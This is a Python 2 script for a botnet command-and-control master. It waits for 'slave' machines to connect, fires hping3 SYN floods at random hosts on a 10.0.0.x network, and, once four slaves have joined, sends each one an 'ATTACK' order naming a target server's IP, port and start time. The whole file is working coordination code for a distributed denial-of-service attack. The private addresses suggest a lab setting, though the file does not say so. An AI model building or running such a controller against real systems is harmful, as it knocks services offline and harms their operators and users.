
import time, datetime, sys, re,ntplib
from socket import *  #importing the socket library for network connections
from time import ctime, time
import subprocess
import random

##Setting up variables
SERVER_HOST = '10.0.0.7'
SERVER_PORT = 8080
MS_LISTEN_HOST = '10.0.0.2'
MS_LISTEN_PORT = 8081

class Master():
  def __init__(self, sock=None):
    if sock is None:
      self.sock = socket(AF_INET, SOCK_STREAM)
    else:
      self.sock = sock
    self.slaves = {}

    self.count=0
    # The server to be attacked
    self.server_ip = SERVER_HOST
    self.server_port = SERVER_PORT

    # get ntp times
    #self.ntpc = ntplib.NTPClient()
    #self.ntp_res = self.ntpc.request('97.107.128.58', version=3)
    self.ntp_res = time()

  def listenConnections(self, port):
    print "Listening for connections"
    self.sock.bind((MS_LISTEN_HOST, port))
    self.sock.listen(5)

  def acceptConnections(self):
    conn, addr = self.sock.accept()
    print('Accepting connection {0}'.format(addr))
    #print('Conn is {0}'.format(conn))
    msg_buf = conn.recv(64)
    if len(msg_buf) > 0:
      #print(msg_buf)
      self.count+=1
      print "Slave "+str(self.count)+" connected at: "+msg_buf
    conn.send('Connected to Master at: {0}'.format(ctime(self.ntp_res)))
    self.slaves[addr] = conn

  def launchAttack(self):
    # get ntp times
    ntpc = ntplib.NTPClient()
    for slave_addr, conn in self.slaves.iteritems():
      ntp_res = time()
#ntpc.request('97.107.128.58', version=3)
      #print ctime(ntp_res)
      conn.send('ATTACK {0} {1} {2}'.format(self.server_ip, self.server_port, ntp_res))
    print "All Slaves ready to ATTACK!!!"

  def closeConnection(self):
    self.sock.close()

if __name__ == '__main__':
    port = MS_LISTEN_PORT
    masterServer = Master()
    masterServer.listenConnections(port)
    while 1:
      masterServer.acceptConnections()
      subprocess.call('hping3 10.0.0.{} -c 10 -S -s 48101 -p 23 --fast'.format(random.randint(3,7)), shell=True)
      if len(masterServer.slaves) >= 4:
        break
    masterServer.launchAttack()
